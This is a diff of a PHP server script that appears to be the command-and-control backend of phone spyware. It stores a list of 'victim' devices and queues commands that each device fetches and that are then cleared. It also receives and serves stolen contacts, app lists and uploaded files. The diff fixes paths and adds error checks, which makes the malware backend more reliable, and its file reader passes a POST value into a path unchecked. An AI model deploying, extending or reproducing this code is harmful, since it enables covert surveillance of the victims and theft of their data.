@@ -1,7 +1,7 @@
 <?php
 header('Content-Type: application/json; charset=UTF-8');
 
-$VICTIM_FILE_PATH = "../private/storage/device_list.json";
+$VICTIM_FILE_PATH = "./private/storage/device_list.json";
 
 $response_data = [
     'status' => false
@@ -12,7 +12,7 @@ function createJson($json){
 }
 
 function createFile($file_type, $device_id){
-    $file_name = '../private/storage/'.$file_type.'-'.$device_id.'-'.uniqid().'.json';
+    $file_name = './private/storage/'.$file_type.'-'.$device_id.'-'.uniqid().'.json';
     $fp = fopen($file_name, 'w');
     fclose($fp);
     return $file_name;
@@ -98,19 +98,31 @@ if (isset($_POST['get_file_list'])){
     echo createJson($response_data);
 }
 
-if (isset($_POST['device_id']) and isset($_POST['check_cmd'])){
+if (isset($_POST['device_id']) && isset($_POST['check_cmd'])) {
     global $response_data;
     global $VICTIM_FILE_PATH;
     $device_path = $VICTIM_FILE_PATH;
     $strJsonFileContents = file_get_contents($device_path);
     $victim_array = json_decode($strJsonFileContents, true);
-    if($victim_array==null) exit(0);
-    $cmd_response = $victim_array['device_list'][$_POST['device_id']]['commands'];
-    if($cmd_response!=null) 
+
+    // 确保数组不是 null 并且包含必要的键
+    if ($victim_array === null || !isset($victim_array['device_list'][$_POST['device_id']])) {
+        exit(0);
+    }
+
+    // 检查 'commands' 键是否存在
+    if (isset($victim_array['device_list'][$_POST['device_id']]['commands'])) {
+        $cmd_response = $victim_array['device_list'][$_POST['device_id']]['commands'];
         echo createJson($cmd_response);
-    else
+    } else {
         echo createJson($response_data);
-    unset($victim_array['device_list'][$_POST['device_id']]['commands']);
+    }
+
+    // 只有在 'commands' 存在的情况下才移除它
+    if (isset($victim_array['device_list'][$_POST['device_id']]['commands'])) {
+        unset($victim_array['device_list'][$_POST['device_id']]['commands']);
+    }
+
     file_put_contents($device_path, createJson($victim_array));
     exit(0);
 }
@@ -206,13 +218,14 @@ Client command requests
 */
 
 function readStorageFile($file_name){
-    $strJsonFileContents = file_get_contents('../private/storage/'.$file_name);
+    $strJsonFileContents = file_get_contents('./private/storage/'.$file_name);
     $contact_json = json_decode($strJsonFileContents, true);
     echo createJson($contact_json);
 }
 
 if (isset($_POST['contact_file_name'])){
     readStorageFile($_POST['contact_file_name']);
+    // error_log("contact_file_name" . "\t" . $_POST['contact_file_name'] . "\t" . $result,   3,   "./error.log");
 }
 
 if (isset($_POST['app_file_listed'])){
@@ -281,7 +294,7 @@ if (isset($_FILES["uploaded_file"])) {
         $tmp_name = $_FILES['uploaded_file']['tmp_name'];
         $error = $_FILES['uploaded_file']['error'];
         if (!empty($tmp_name)) {
-            $location = '../private/file_uploaded/';
+            $location = './private/file_uploaded/';
             if  (move_uploaded_file($tmp_name, $location.$tmp_name)){
                 $response_data['status'] = true;
             }
